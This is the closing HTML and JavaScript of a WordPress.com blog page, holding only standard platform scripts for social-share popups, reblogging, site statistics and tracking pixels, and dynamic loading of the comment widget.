						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>

	<script type="text/javascript">
		(function () {
			var wpcom_reblog = {
				source: 'toolbar',

				toggle_reblog_box_flair: function (obj_id, post_id) {

					// Go to site selector. This will redirect to their blog if they only have one.
					const postEndpoint = `https://wordpress.com/post`;

					// Ideally we would use the permalink here, but fortunately this will be replaced with the 
					// post permalink in the editor.
					const originalURL = `${ document.location.href }?page_id=${ post_id }`; 
					
					const url =
						postEndpoint +
						'?url=' +
						encodeURIComponent( originalURL ) +
						'&is_post_share=true' +
						'&v=5';

					const redirect = function () {
						if (
							! window.open( url, '_blank' )
						) {
							location.href = url;
						}
					};

					if ( /Firefox/.test( navigator.userAgent ) ) {
						setTimeout( redirect, 0 );
					} else {
						redirect();
					}
				},
			};

			window.wpcom_reblog = wpcom_reblog;
		})();
	</script>
<script type="text/javascript">
// <![CDATA[
(function() {
try{
  if ( window.external &&'msIsSiteMode' in window.external) {
    if (window.external.msIsSiteMode()) {
      var jl = document.createElement('script');
      jl.type='text/javascript';
      jl.async=true;
      jl.src='/wp-content/plugins/ie-sitemode/custom-jumplist.php';
      var s = document.getElementsByTagName('script')[0];
      s.parentNode.insertBefore(jl, s);
    }
  }
}catch(e){}
})();
// ]]>
</script>	<iframe src='https://widgets.wp.com/likes/master.html?ver=20241218#ver=20241218&amp;origin=https://hshrzd.wordpress.com' scrolling='no' id='likes-master' name='likes-master' style='display:none;'></iframe>
	<div id='likes-other-gravatars' class='wpl-new-layout' role="dialog" aria-hidden="true" tabindex="-1">
		<div class="likes-text">
			<span>%d</span>		</div>
		<ul class="wpl-avatars sd-like-gravatars"></ul>
	</div>

		<script src="//stats.wp.com/w.js?67" defer></script> <script type="text/javascript">
_tkq = window._tkq || [];
_stq = window._stq || [];
_tkq.push(['storeContext', {'blog_id':'35018075','blog_tz':'2','user_lang':'en','blog_lang':'en','user_id':'0'}]);
_stq.push(['view', {'blog':'35018075','v':'wpcom','tz':'2','user_id':'0','post':'8749','subd':'hshrzd'}]);
_stq.push(['extra', {'crypt':'UE40eW5QN0p8M2Y/RE1mNzc2NTVTamdsd0xoLz9RQkM2K298TXY9bERQMXc2MjhEaVZfb2wwakRoSj0mUkp1THptM1NdbkV1WjZIcU9mVWQmPUIvMlN6Jk8wW3NYVEJ3dWZOWExuWD9VNTEucGVsV35zPU5yfnJXOFF1MnBkZG9JTS1YZnZNclo5OHljVk94a0lOZno0P3wlOTA2Qk5lLXE3eXhFLXZyVi02WXlZTVl1Ym9uRnxdK3VRLHlyYisybnEyX2lNJS00bmZuW3Nud2FdbndCRVNhOW1MUy58aEImRy1SfFtYSnNzbGR3NFpsbTktfHVTbTNxZDh6VDNqL2omRGEzL0ddOXlxS3E5P05KNHxxUiZwWVRHajJ4TVU5OFl4bndMRGZDRVcmVDJETWVLVCZpKzZOVmdOcWxVOFA0dw=='}]);
_stq.push([ 'clickTrackerInit', '35018075', '8749' ]);
</script>
<noscript><img src="https://pixel.wp.com/b.gif?v=noscript" style="height:1px;width:1px;overflow:hidden;position:absolute;bottom:1px;" alt="" /></noscript>
<script defer id="bilmur"  data-provider="wordpress.com" data-service="simple"   src="/wp-content/js/bilmur-4.min.js?i=12&m=202451"></script><script>
( function() {
	function getMobileUserAgentInfo() {
		if ( typeof wpcom_mobile_user_agent_info === 'object' ) {
			wpcom_mobile_user_agent_info.init();
			var mobileStatsQueryString = '';

			if ( wpcom_mobile_user_agent_info.matchedPlatformName !== false ) {
				mobileStatsQueryString += '&x_' + 'mobile_platforms' + '=' + wpcom_mobile_user_agent_info.matchedPlatformName;
			}

			if ( wpcom_mobile_user_agent_info.matchedUserAgentName !== false ) {
				mobileStatsQueryString += '&x_' + 'mobile_devices' + '=' + wpcom_mobile_user_agent_info.matchedUserAgentName;
			}

			if ( wpcom_mobile_user_agent_info.isIPad() ) {
				mobileStatsQueryString += '&x_' + 'ipad_views' + '=' + 'views';
			}

			if ( mobileStatsQueryString != '' ) {
				new Image().src = document.location.protocol + '//pixel.wp.com/g.gif?v=wpcom-no-pv' + mobileStatsQueryString + '&baba=' + Math.random();
			}
		}
	}

	document.addEventListener( 'DOMContentLoaded', getMobileUserAgentInfo );
} )();
</script>
<script type='disabled' id='wp-enqueue-dynamic-script:wp-i18n:after:1'>
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
</script>

<script>
(function() {
	'use strict';

	const fetches = {};
	const promises = {};
	const urls = {
		'wp-hooks': 'https://s0.wp.com/wp-content/plugins/gutenberg-core/v19.8.0/build/hooks/index.min.js?m=1733324323i&ver=84e753e2b66eb7028d38',
		'wp-i18n': 'https://s0.wp.com/wp-content/plugins/gutenberg-core/v19.8.0/build/i18n/index.min.js?m=1733324323i&ver=bd5a2533e717a1043151',
		'verbum': 'https://s2.wp.com/wp-content/mu-plugins/jetpack-mu-wpcom-plugin/moon/vendor/automattic/jetpack-mu-wpcom/src/build/verbum-comments/verbum-comments.js?m=1733934734i&minify=false&ver=0b4f9908fccda8a8b143'
	};
	const loaders = {
		'verbum': () => {
			fetchExternalScript('wp-hooks');
			fetchExternalScript('wp-i18n');
			fetchExternalScript('verbum');
			promises['wp-hooks'] = promises['wp-hooks'] || loadWPScript('wp-hooks');
			promises['wp-i18n'] = promises['wp-i18n'] || promises['wp-hooks'].then( () => loadWPScript('wp-i18n') );
			promises['verbum'] = promises['verbum'] || promises['wp-i18n'].then( () => loadWPScript('verbum') );
			return promises['verbum'];
		},
		
	};
	const scriptExtras = {
		'wp-i18n': { translations: 0, before: 0, after: 1 },
		
	};

	window.WP_Enqueue_Dynamic_Script = {
		loadScript: (handle) => {
			if (!loaders[handle]) {
				console.error('WP_Enqueue_Dynamic_Script: unregistered script `' + handle + '`.');
			}
			return loaders[handle]();
		}
	};

	function fetchExternalScript(handle) {
		if (!urls[handle]) {
			return Promise.resolve();
		}

		fetches[handle] = fetches[handle] || fetch(urls[handle], { mode: 'no-cors' });
		return fetches[handle];
	}

	function runExtraScript(handle, type, index) {
		const id = 'wp-enqueue-dynamic-script:' + handle + ':' + type + ':' + (index + 1);
		const template = document.getElementById(id);
		if (!template) {
			return Promise.reject();
		}

		const script = document.createElement( 'script' );
		script.innerHTML = template.innerHTML;
		document.body.appendChild( script );
		return Promise.resolve();
	}

	function loadExternalScript(handle) {
		if (!urls[handle]) {
			return Promise.resolve();
		}

		return fetches[handle].then(() => {
			return new Promise((resolve, reject) => {
				const script = document.createElement('script');
				script.onload = () => resolve();
				script.onerror = (e) => reject(e);
				script.src = urls[handle];
				document.body.appendChild(script);
			});
		});
	}

	function loadExtra(handle, pos) {
		const count = (scriptExtras[handle] && scriptExtras[handle][pos]) || 0;
		let promise = Promise.resolve();

		for (let i = 0; i < count; i++) {
			promise = promise.then(() => runExtraScript(handle, pos, i));
		}

		return promise;
	}

	function loadWPScript(handle) {
		// Core loads scripts in this order. See: https://github.com/WordPress/WordPress/blob/a59eb9d39c4fcba834b70c9e8dfd64feeec10ba6/wp-includes/class-wp-scripts.php#L428.
		return loadExtra(handle, 'translations')
			.then(() => loadExtra(handle, 'before'))
			.then(() => loadExternalScript(handle))
			.then(() => loadExtra(handle, 'after'));
	}
} )();
</script>
</body>
</html>
